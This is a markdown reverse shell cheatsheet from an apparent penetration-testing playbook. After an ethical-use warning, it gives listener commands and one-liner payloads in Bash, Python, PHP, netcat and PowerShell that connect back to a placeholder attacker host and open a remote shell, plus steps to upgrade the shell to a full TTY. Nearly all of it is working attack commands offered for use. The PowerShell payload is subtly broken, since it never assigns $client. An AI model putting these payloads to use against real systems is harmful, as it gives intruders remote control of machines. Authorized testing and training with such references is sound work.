# 🐚 Reverse Shell Reference Cheatsheet

A collection of common one-liners to establish a reverse shell during security assessments.

> [!WARNING]
> **Ethical Use Only:** These commands are strictly for authorized penetration testing and educational purposes. Use them only on systems you have explicit permission to test.

## 🛠️ Listener Setup
Before executing any of the payloads below, set up a listener on your machine.

```bash
# Using Netcat
nc -lvnp <LPORT>

# Using Socat (more stable, supports TTY)
socat -d -d TCP-LISTEN:<LPORT> STDOUT
```

## 🚀 Common Payloads
Replace `<LHOST>` with your IP and `<LPORT>` with your listener port.

### Bash
Most reliable on Linux systems.
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

### Python
Useful when `bash` isn't an option but Python is installed.
```python
# Python 3
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### PHP
Great for web application vulnerabilities (e.g., File Upload or Command Injection).
```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Netcat (Traditional)
If the version of `nc` installed supports the `-e` flag.
```bash
nc <LHOST> <LPORT> -e /bin/bash
```

### PowerShell
For Windows targets.
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## 💎 TTY Upgrade
If you get a shell but it's "dumb" (no tab-complete, no arrows), try upgrading it:

1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `Ctrl + Z` (Background the shell)
3. `stty raw -echo; fg` (In your local terminal)
4. `reset` (Hit Enter)

---
*Return to [SimplySec Playbook](../README.md)*
